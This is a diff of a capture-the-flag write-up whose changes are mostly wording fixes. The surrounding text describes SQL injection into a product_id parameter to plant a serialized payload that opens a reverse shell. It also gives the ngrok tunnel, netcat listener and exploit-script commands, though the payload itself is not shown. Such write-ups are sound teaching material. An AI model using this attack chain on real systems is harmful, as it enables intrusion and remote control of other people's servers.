@@ -50,7 +50,7 @@ def close_connection(exception):
     if db is not None: db.close()
 ```
 
-We can write a script that performs an SQL injection on the product_id parameter to add our serialized payload that then spawns a reverse shell. I didn't managed to get `cat flag.txt` payload to work, but a reverse shell did work.
+We can write a script that performs an SQL injection on the product_id parameter to add our serialized payload that then spawns a reverse shell. I didn't managed to get the `cat flag.txt` payload to work, but a reverse shell did work.
 
 ```python
 import requests
@@ -73,17 +73,17 @@ print(response.request.url)
 print(response.content)
 ```
 
-Important to first install and run ngrok, replace `NGROK_URL` and `NGROK_PORT` in the payload:
+Important to first install and run [ngrok](https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html), replace `NGROK_URL` and `NGROK_PORT` in the payload:
 ```bash
 $ Downloads/ngrok tcp 9001
 ```
 
-Start a netcat session to catch the reverse shell:
+Start a netcat session, in a seperate terminal, to catch the reverse shell:
 ```bash
 $ nc -lvnp 9001
 ```
 
-After running the exploit script, we get a shell through netcat that was setup in a seperate terminal:
+After running the exploit script, we get a shell through our netcat listener:
 ```bash
 $ python3 exploit2.py 161.35.164.69:31934
 ```
